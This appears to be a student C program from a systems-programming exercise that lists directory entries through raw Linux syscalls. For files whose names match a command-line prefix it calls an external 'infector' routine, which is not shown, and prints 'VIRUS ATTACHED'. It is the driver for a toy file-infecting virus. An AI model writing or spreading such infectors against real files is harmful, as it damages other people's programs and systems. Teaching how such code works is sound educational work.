#define SYS_OPEN     5
#define SYS_GETDENTS 141
#define SYS_WRITE    4
#define SYS_CLODE    
#define SYS_EXIT     1

#define BUFFER_SIZE  8192

#define O_RDONLY 00
#define O_RDWR          2
#define O_DIRECTORY 0200000
#define S_IRWXU  00700
#define STDOUT 1

extern int system_call();
extern int strlen(char* s);
extern int strncmp(char* s1, char* s2, int l);
extern void infector(char* filename);

char direntBuffer[BUFFER_SIZE];

typedef struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
} linux_dirent;

void printChar(char c) {
    system_call(SYS_WRITE, STDOUT, &c, 1);
}

int main(int argc, char** argv) {
    char* perfix = 0;
    int i;
    for (i = 0; i < argc; i++) 
        if (argv[i][0] == '-' && argv[i][1] == 'a') 
            perfix = argv[i] + 2;
    int p_len = 0;
    if (perfix) p_len = strlen(perfix);

    unsigned int fd = system_call(SYS_OPEN, ".", O_RDONLY, S_IRWXU);
    long x = system_call(SYS_GETDENTS, fd, direntBuffer, BUFFER_SIZE);
    if (x < 0) 
        system_call(SYS_EXIT, 55);
    
    int r = 0;
    linux_dirent* dirent;
    while (r < BUFFER_SIZE) {
        dirent = (linux_dirent*) (direntBuffer+r);
        if (perfix && strncmp(perfix, dirent->d_name, p_len) == 0) {
            infector(dirent->d_name);
            system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", 15);
            printChar('-');
            system_call(SYS_WRITE, STDOUT, dirent->d_name, dirent->d_reclen - 10);
        }
        else system_call(SYS_WRITE, STDOUT, dirent->d_name, dirent->d_reclen - 10);
        
        printChar('\n');
        r += dirent->d_reclen;
        if (dirent->d_reclen == 0) break;
    }
    return 0;
}